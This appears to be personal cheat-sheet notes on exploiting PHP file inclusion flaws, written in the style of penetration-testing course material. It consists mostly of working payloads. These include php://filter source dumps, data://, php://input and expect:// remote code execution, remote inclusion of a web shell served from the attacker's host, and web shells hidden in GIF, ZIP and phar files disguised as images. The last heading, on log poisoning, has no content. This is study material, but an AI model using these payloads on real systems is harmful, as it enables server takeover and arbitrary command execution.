# Local file inclusion
## PHP filter

The interesting part, is to find first the php files with ffuf

    ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

after that we can try to retrieve the code using the filters.

    php://filter/read=convert.base64-encode/resource=config


## PHP wrappers
### DATA

the data wrapper is what allows to include external data, including php code, and it can allow us to have an RCE.

first we check the php configurations:

Nginx `/etc/php/X.Y/fpm/php.ini`

Apache `/etc/php/X.Y/apache2/php.ini`

and we check for the parameter `allow_url_include` it has to be on in order to include php code as follows:

    echo '<?php system($_GET["cmd"]); ?>' | base64

    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

### input

Similar to data, the only difference that the server needs to accept POST requests.

    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
           
### Expect

Finally we have the expect, which allows us to run commands directly as follows but before we have to check the configurations and grep expect:

    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"


## RFI

to locate the RFI, the url needs to be allowed, and to confim that we do the same thing we did before to check the `allow_url_include = On` and try this payload:

    http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

and to exploit it, we start by writing the web shell

    echo '<?php system($_GET["cmd"]); ?>' > shell.php

we start an http listener with python and launch the payload.

    http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

it can also be done with ftp, smb, https (maybe not tested)

### File inclusion upload

We can try LFI to upload payloads depending on the situation, example of a set of payloads.

    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

and example of calling it as follow: 

    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

We can also try a zip upload:

    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

and we can use the zip wrapper in order to call the payload (warning the wrapper has to be enabled and it doesn't always work)

    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

### Phar 

Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:

```sh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

and we can call the payload as follow

    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

## LOG poisoning my favourite <3